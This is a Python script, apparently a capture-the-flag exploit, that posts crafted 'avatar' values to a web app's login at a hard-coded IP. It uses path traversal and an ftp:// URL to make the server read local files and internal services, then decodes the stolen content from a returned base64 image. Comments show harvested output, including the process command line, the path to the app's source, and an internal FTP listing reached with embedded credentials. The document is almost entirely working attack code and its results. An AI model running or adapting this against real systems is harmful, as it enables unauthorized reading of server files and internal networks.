import requests
import random
import string
from base64 import b64decode
from bs4 import BeautifulSoup


def get_random_string(n):
	return ''.join(random.choice(string.printable) for i in range(n))

proxies = {
	'http': 'http://127.0.0.1:8080',
	'https': 'http://127.0.0.1:8080'
}

# host = '52.163.52.206'
host =  '23.98.68.11'
username = get_random_string(12)
i = 0

while True:
	file = input('file: ')
	r = requests.post(f'http://{host}:8088/login', proxies=proxies, verify=False, data={
		'username': username + str(i),
		'password': username,
		'avatar': file
	})
	soup = BeautifulSoup(r.content, 'html.parser')
	data = b64decode(soup.img['src'][len('data:image/png;base64,'):])
	with open('tmp.bin', 'wb') as f:
		f.write(data)
	if not data or data.startswith(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\xc8\x00\x00'):
		print('Fail')
	else:
		print(data.decode())
	i += 1

# file: ../../../../proc/self/cmdline
# /usr/local/bin/python3.6/usr/local/bin/gunicorn -b 0.0.0.0:5000 -w 6 --threads 6 --log-level debug app:app

# file: ../../../../app/app.py
# import logging
# ...

# file: ftp://fan:root@172.20.0.2:8877
# drwxrwxr-x   2 root     root         4096 Jan 15 06:51 files
# -rw-rw-r--   1 root     root          464 Jan 15 06:51 ftp-server.py
